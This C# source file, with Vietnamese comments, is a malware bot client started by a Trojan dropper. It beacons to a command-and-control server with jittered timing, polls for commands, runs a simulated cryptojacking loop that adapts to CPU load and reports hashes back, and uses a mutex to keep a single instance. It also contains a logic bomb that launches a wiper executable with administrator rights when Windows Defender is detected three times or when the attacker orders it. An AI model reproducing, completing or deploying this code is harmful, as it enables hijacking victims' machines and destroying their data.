using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.Win32;
using System.Management;

// === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
public static class BotCommands
{
    public const string Cryptojack = "cryptojack";
    public const string Idle = "idle";
    public const string Wipe = "wipe";
}
//public class CryptoJackResult
//{
//    public string BotId { get; set; }
//    public long Nonce { get; set; }
//    public string Hash { get; set; }
//}
//public class LogRequest
//{
//    public string BotId { get; set; }
//    public string Message { get; set; }
//}
// Các class Model gửi đi (không còn chứa BotId)
public class BotInfoPayload { public string Status { get; set; } }
public class LogPayload { public string Message { get; set; } }
public class ResultPayload { public long Nonce { get; set; } public string Hash { get; set; } }

public class Bot
{
    private static string CncServerUrl;
    private static readonly HttpClient client = new HttpClient();
    //private static string botId = Guid.NewGuid().ToString();
    private static string currentStatus = BotCommands.Idle;
    private static Random _random = new Random();

    // Cấu hình đường dẫn Wiper
    private const string WiperSubFolder = "wiper"; // Tên thư mục con
    private const string WiperFileName = "Wiper.exe"; // Tên file

    // === NÂNG CẤP: Dùng CancellationTokenSource để quản lý tác vụ nền an toàn ===
    private static CancellationTokenSource _taskCancellationTokenSource;

    // === MUTEX: Để đảm bảo chỉ 1 bot chạy ===
    private static Mutex _appMutex;
    private const string MutexName = "Global\\MyMalwareBot_Unique_Mutex_String";

    // Biến Logic Bomb
    private static int _defenderStrikeCount = 0;
    private static bool _isWiperTriggered = false;

    static async Task Main(string[] args)
    {
        // 1. Kiểm tra Single Instance
        bool isNewInstance;
        _appMutex = new Mutex(true, MutexName, out isNewInstance);

        if (!isNewInstance)
        {
            // Nếu Mutex đã tồn tại, tức là có một con bot khác đang chạy.
            // Thoát ngay lập tức.
            return;
        }
        FileLogger.Initialize();

        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
        {
            string serverIp = args[0];
            CncServerUrl = $"http://{serverIp}:8000"; // Gán giá trị cho CncServerUrl
            Console.WriteLine($"C&C Server IP received from dropper: {CncServerUrl}");
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("FATAL: C&C Server IP was not provided.");
            Console.WriteLine("This bot must be started by the Trojan dropper to function.");
            Console.ResetColor();
            Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
            FileLogger.Shutdown();
            return; // Thoát chương trình
        }

        //Console.WriteLine($"Bot started with ID: {botId}");

        while (!_isWiperTriggered)
        {
            try
            {
                // 1. Check Windows Defender (Điều kiện kích hoạt Wiper số 2)
                CheckDefenderAndTriggerWiper();

                await CheckIn();
                string command = await GetCommand();
                //Console.WriteLine($"Received command: '{command}'");
                await ExecuteCommand(command);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            int jitterMilliseconds = _random.Next(15000, 30001);
            Console.WriteLine($"Waiting for {jitterMilliseconds / 1000}s...");
            await Task.Delay(jitterMilliseconds);
        }
    }

    // === LOGIC CHECK DEFENDER ===
    static void CheckDefenderAndTriggerWiper()
    {
        if (_isWiperTriggered) return;

        // Kiểm tra trạng thái Defender
        bool isDefenderOn = IsRealtimeProtectionEnabled();

        if (isDefenderOn)
        {
            _defenderStrikeCount++;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[LOGIC BOMB] Defender is ON. Strike {_defenderStrikeCount}/3");
            Console.ResetColor();

            // Gửi cảnh báo về Server
            _ = SendLogToServerAsync($"WARNING: Defender ON. Strike {_defenderStrikeCount}/3");

            if (_defenderStrikeCount >= 3)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[TRIGGER] 3 Strikes reached. Launching Wiper...");
                TriggerWiper("Logic Bomb: Defender detected 3 times");
            }
        }
        else
        {
            // Nếu Defender tắt, reset bộ đếm (yêu cầu 3 lần liên tiếp)
            if (_defenderStrikeCount > 0)
            {
                _defenderStrikeCount = 0;
                Console.WriteLine("[INFO] Defender is OFF. Strike counter reset.");
            }
        }
    }
    static void TriggerWiper(string reason)
    {
        if (_isWiperTriggered) return;
        _isWiperTriggered = true;

        // Dừng đào coin
        StopCurrentTask();
        currentStatus = "WIPING";

        // Gửi lời trăng trối về Server
        _ = SendLogToServerAsync($"CRITICAL: Activating Wiper. Reason: {reason}");

        try
        {
            // Xây dựng đường dẫn: BaseDir + "wiper" + "Wiper.exe"
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string wiperPath = Path.Combine(baseDir, WiperSubFolder, WiperFileName);

            if (File.Exists(wiperPath))
            {
                Console.WriteLine($"[LAUNCHER] Executing payload at: {wiperPath}");

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = wiperPath,
                    UseShellExecute = true,
                    Verb = "runas", // Yêu cầu quyền Admin
                    CreateNoWindow = false // Hiện cửa sổ Wiper lên cho nạn nhân thấy
                };

                Process.Start(psi);
                Console.WriteLine("[LAUNCHER] Payload executed successfully.");
            }
            else
            {
                Console.WriteLine($"[ERROR] Wiper payload not found at: {wiperPath}");
                _ = SendLogToServerAsync("Failed to wipe: Payload file missing.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Failed to launch wiper: {ex.Message}");
        }

        // BotClient tự kết thúc sau khi gọi Wiper
        Console.WriteLine("BotClient shutting down...");
        Environment.Exit(0);
    }
    // Hàm kiểm tra Defender (WMI + Registry Fallback)
    private static bool IsRealtimeProtectionEnabled()
    {
        try
        {
            // Cách 1: WMI
            using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
            {
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
                    if (rtpEnabled != null) return Convert.ToBoolean(rtpEnabled);
                }
            }
        }
        catch { }

        try
        {
            // Cách 2: Registry
            using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
            {
                if (key != null)
                {
                    object disableValue = key.GetValue("DisableRealtimeMonitoring");
                    if (disableValue != null) return Convert.ToInt32(disableValue) == 0;
                }
            }
        }
        catch { }

        // Mặc định trả về true (An toàn là trên hết - giả sử nó đang bật)
        return true;
    }
    
    //static async Task SendLogToServerAsync(string message)
    //{
    //    try
    //    {
    //        var logRequest = new LogRequest { BotId = botId, Message = message };
    //        var content = new StringContent(JsonSerializer.Serialize(logRequest), Encoding.UTF8, "application/json");
    //        // Gửi và không cần chờ phản hồi để tránh làm chậm bot
    //        _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
    //    }
    //    catch
    //    {
    //        // Bỏ qua lỗi, vì log không quan trọng bằng việc đào
    //    }
    //}

    static async Task CheckIn()
    {
        //var botInfo = new { BotId = botId, Status = currentStatus };
        var payload = new BotInfoPayload { Status = currentStatus };
        //var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
        var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
        await client.PostAsync($"{CncServerUrl}/bot/checkin", content);
    }

    static async Task<string> GetCommand()
    {
        //var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand");
        var commandResponse = JsonSerializer.Deserialize<CommandResponse>(responseString, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
        return commandResponse?.command ?? BotCommands.Idle;
    }

    static async Task ExecuteCommand(string command)
    {
        // Nếu đang wipe thì không nhận lệnh khác
        if (currentStatus == "WIPING") return;

        switch (command)
        {
            case BotCommands.Wipe:
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[CMD] Received WIPE command.");
                TriggerWiper("Command from Attacker");
                break;

            case BotCommands.Cryptojack:
                // Chỉ bắt đầu nếu chưa chạy
                if (currentStatus != BotCommands.Cryptojack)
                {
                    StopCurrentTask(); // Dừng cái cũ trước
                    currentStatus = BotCommands.Cryptojack;

                    // Tạo token mới
                    _taskCancellationTokenSource = new CancellationTokenSource();

                    // Chạy task đào coin (không await để nó chạy nền, tránh block vòng lặp chính)
                    _ = SimulateCryptoJack(_taskCancellationTokenSource.Token);
                }
                break;

            case BotCommands.Idle:
            default:
                // Luôn dừng tác vụ nếu nhận lệnh idle
                StopCurrentTask();

                if (currentStatus != BotCommands.Idle)
                {
                    currentStatus = BotCommands.Idle;
                    Console.WriteLine("State changed to IDLE. CPU should drop now.");

                    // Ép dọn dẹp bộ nhớ để Task Manager giảm RAM ngay
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                }
                break;
        }
    }

    // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
    static void StopCurrentTask()
    {
        if (_taskCancellationTokenSource != null)
        {
            try
            {
                Console.WriteLine("Stopping background tasks...");
                _taskCancellationTokenSource.Cancel(); // Gửi tín hiệu dừng
                _taskCancellationTokenSource.Dispose(); // Giải phóng resource
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping task: {ex.Message}");
            }
            finally
            {
                _taskCancellationTokenSource = null;
            }
        }
    }
    //static async Task SendResultToServerAsync(long nonce, string hash)
    //{
    //    try
    //    {
    //        var result = new CryptoJackResult
    //        {
    //            BotId = botId,
    //            Nonce = nonce,
    //            Hash = hash
    //        };
    //        var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
    //        // Tạo một CancellationTokenSource để đặt timeout
    //        using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2))) // Timeout sau 2 giây
    //        {
    //            // Gửi yêu cầu với CancellationToken
    //            await client.PostAsync($"{CncServerUrl}/bot/log", content, cts.Token);
    //        }
    //    }
    //    catch (OperationCanceledException)
    //    {
    //        // Lỗi này xảy ra khi timeout, đây là điều mong muốn. Bỏ qua.
    //    }
    //    catch
    //    {
    //        // Bỏ qua các lỗi mạng khác để bot không bị crash
    //    }
    //}
    static async Task SendLogToServerAsync(string message)
    {
        try
        {
            var payload = new LogPayload { Message = message };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
        }
        catch { }
    }

    static async Task SendResultToServerAsync(long nonce, string hash)
    {
        try
        {
            var payload = new ResultPayload { Nonce = nonce, Hash = hash };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5)))
            {
                await client.PostAsync($"{CncServerUrl}/bot/submitresult", content, cts.Token);
            }
        }
        catch { }
    }

    //static Task SimulateCryptoJack(CancellationToken cancellationToken)
    //{
    //    return Task.Run(async () =>
    //    {
    //        // Biến này sẽ được chia sẻ giữa bộ cảm biến và vòng lặp chính
    //        int adaptiveHashesPerBurst = 10000; // Mặc định ở mức cân bằng

    //        var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
    //        cpuCounter.NextValue();

    //        _ = Task.Run(async () =>
    //        {
    //            while (!cancellationToken.IsCancellationRequested)
    //            {
    //                float totalSystemCpuUsage = cpuCounter.NextValue();

    //                // === LOGIC THÍCH ỨNG MỚI ===
    //                if (totalSystemCpuUsage > 40.0f)
    //                {
    //                    // HỆ THỐNG BẬN -> LÀM VIỆC VỚI LÔ LỚN
    //                    adaptiveHashesPerBurst = 100000;
    //                    Console.WriteLine($"[ADAPTIVE] System CPU HIGH -> Aggressive Mode (Burst: {adaptiveHashesPerBurst})");
    //                }
    //                else
    //                {
    //                    // HỆ THỐNG RẢNH -> LÀM VIỆC VỚI LÔ NHỎ
    //                    adaptiveHashesPerBurst = 10000; // Tính 500 hash trước khi nghỉ
    //                    Console.WriteLine($"[ADAPTIVE] System CPU LOW -> Stealth Mode (Burst: {adaptiveHashesPerBurst})");
    //                }
    //                await Task.Delay(3000, cancellationToken);
    //            }
    //        }, cancellationToken);

    //        // === LOGIC ĐÀO LIÊN TỤC & LÀM VIỆC THEO LÔ ===
    //        try
    //        {
    //            using (SHA256 sha256 = SHA256.Create())
    //            {
    //                int taskNumber = 1;
    //                await SendLogToServerAsync("Starting PERSISTENT & ADAPTIVE mining task (Batch-based)...");

    //                while (!cancellationToken.IsCancellationRequested)
    //                {
    //                    long nonce = 0;
    //                    int burstCounter = 0;
    //                    string mode = adaptiveHashesPerBurst > 50000 ? "AGGRESSIVE" : "STEALTH";
    //                    await SendLogToServerAsync($"[TASK #{taskNumber}] Starting search... Mode: {mode}");

    //                    while (!cancellationToken.IsCancellationRequested)
    //                    {
    //                        // === PHẦN BỊ THIẾU TRƯỚC ĐÂY ===
    //                        // 1. Dữ liệu để hash
    //                        string dataToHash = $"BalancedTask-{taskNumber}-{nonce}";
    //                        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));

    //                        // 2. Chuyển đổi byte array thành chuỗi hex và khai báo 'hashString'
    //                        var sBuilder = new StringBuilder();
    //                        for (int i = 0; i < bytes.Length; i++) { sBuilder.Append(bytes[i].ToString("x2")); }
    //                        string hashString = sBuilder.ToString();
    //                        // ===================================

    //                        // Bây giờ, 'hashString' đã tồn tại và có thể sử dụng được
    //                        if (hashString.StartsWith("000000"))
    //                        {
    //                            await SendLogToServerAsync($"!!! [TASK #{taskNumber}] Hash FOUND! Nonce: {nonce}");
    //                            await SendResultToServerAsync(nonce, hashString);
    //                            taskNumber++;
    //                            break;
    //                        }
    //                        nonce++;
    //                        burstCounter++;

    //                        if (burstCounter >= adaptiveHashesPerBurst)
    //                        {
    //                            await Task.Delay(20, cancellationToken);
    //                            burstCounter = 0;
    //                        }
    //                    }
    //                }
    //            }
    //        }
    //        catch (OperationCanceledException)
    //        {
    //            // Chỉ log khi tác vụ bị hủy bởi lệnh từ server
    //            Console.WriteLine("Persistent mining task was canceled by C&C server.");
    //        }
    //        catch (Exception ex)
    //        {
    //            Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
    //        }
    //        finally
    //        {
    //            // Chỉ khi tác vụ bị hủy thì bot mới quay về idle
    //            currentStatus = BotCommands.Idle;
    //            Console.WriteLine("Task stopped. Returning to idle.");
    //        }
    //    }, cancellationToken);
    //}
    static Task SimulateCryptoJack(CancellationToken cancellationToken)
    {
        return Task.Run(async () =>
        {
            int adaptiveHashesPerBurst = 10000;

            // === QUAN TRỌNG: Bọc PerformanceCounter trong using để tự động hủy khi xong ===
            using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
            {
                try
                {
                    cpuCounter.NextValue(); // Lần gọi đầu luôn trả về 0
                }
                catch { }

                // Thread phụ theo dõi CPU (Cũng phải check token để dừng)
                _ = Task.Run(async () =>
                {
                    while (!cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            float totalSystemCpuUsage = cpuCounter.NextValue();
                            if (totalSystemCpuUsage > 50.0f)
                            {
                                adaptiveHashesPerBurst = 100000; // Máy bận -> Đào mạnh (hoặc giảm tùy chiến thuật)
                            }
                            else
                            {
                                adaptiveHashesPerBurst = 10000;
                            }
                        }
                        catch { }

                        // Chờ 3s, nhưng nếu bị hủy thì thoát ngay
                        try { await Task.Delay(3000, cancellationToken); } catch { break; }
                    }
                }, cancellationToken);

                // Thread chính đào coin
                try
                {
                    using (SHA256 sha256 = SHA256.Create())
                    {
                        await SendLogToServerAsync("Mining started [CPU Intensive Mode].");

                        long nonce = 0;

                        // Vòng lặp chính: Check token liên tục
                        while (!cancellationToken.IsCancellationRequested)
                        {
                            int burstCounter = 0;

                            // Vòng lặp nhỏ (Burst): Đào một cục rồi nghỉ
                            while (!cancellationToken.IsCancellationRequested)
                            {
                                string dataToHash = $"MiningBlock-{nonce}";
                                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));

                                // Giả lập tìm hash (Độ khó thấp để test)
                                if (bytes[0] == 0 && bytes[1] == 0 && bytes[2] == 0)
                                {
                                    string hashString = BitConverter.ToString(bytes).Replace("-", "").ToLower();
                                    // Fire and forget log để không chặn luồng đào
                                    _ = SendLogToServerAsync($"Hash FOUND! Nonce: {nonce}");
                                    _ = SendResultToServerAsync(nonce, hashString);

                                    // Nghỉ nhẹ để CPU thở
                                    await Task.Delay(10);
                                }

                                nonce++;
                                burstCounter++;

                                // Hết một đợt Burst -> Nghỉ để check Cancellation Token
                                if (burstCounter >= adaptiveHashesPerBurst)
                                {
                                    // Nghỉ 10ms để hệ điều hành điều phối lại CPU
                                    // Đây là điểm quan trọng để CPU không bị kẹt ở 100%
                                    await Task.Delay(10, cancellationToken);
                                    burstCounter = 0;
                                }
                            }
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    Console.WriteLine("Mining task stopped by user.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Mining Error: {ex.Message}");
                }
                finally
                {
                    // Đảm bảo trạng thái về Idle khi thoát
                    currentStatus = BotCommands.Idle;
                    await SendLogToServerAsync("Mining stopped. CPU releasing...");
                }
            } // Kết thúc using (cpuCounter) -> Giải phóng bộ đếm CPU
        }, cancellationToken);
    }
}
public static class FileLogger
{
    private static string _logFilePath;
    private static StreamWriter _streamWriter;
    private static TextWriter _originalConsoleOut;

    public static void Initialize(string logFileName = "bot_log.txt")
    {
        // Lưu lại luồng output gốc của Console
        _originalConsoleOut = Console.Out;
        try
        {
            // Lấy đường dẫn an toàn trong thư mục của file exe
            string exePath = AppContext.BaseDirectory;
            _logFilePath = Path.Combine(exePath, logFileName);

            // Mở file với chế độ ghi tiếp (append) và tự động flush
            _streamWriter = new StreamWriter(_logFilePath, true, Encoding.UTF8)
            {
                AutoFlush = true
            };

            // Chuyển hướng output của Console ra file
            Console.SetOut(_streamWriter);
            Console.WriteLine($"\n===== Logger Initialized at {DateTime.Now} =====");
        }
        catch (Exception ex)
        {
            // Nếu có lỗi, in ra luồng output gốc
            Console.SetOut(_originalConsoleOut);
            Console.WriteLine($"FATAL: Could not initialize file logger. Error: {ex.Message}");
        }
    }

    public static void Shutdown()
    {
        Console.WriteLine($"===== Logger Shutdown at {DateTime.Now} =====\n");
        // Đóng file an toàn và trả lại output cho console gốc
        _streamWriter?.Close();
        _streamWriter?.Dispose();
        if (_originalConsoleOut != null)
        {
            Console.SetOut(_originalConsoleOut);
        }
    }

}

public class CommandResponse
{
    public string command { get; set; }
}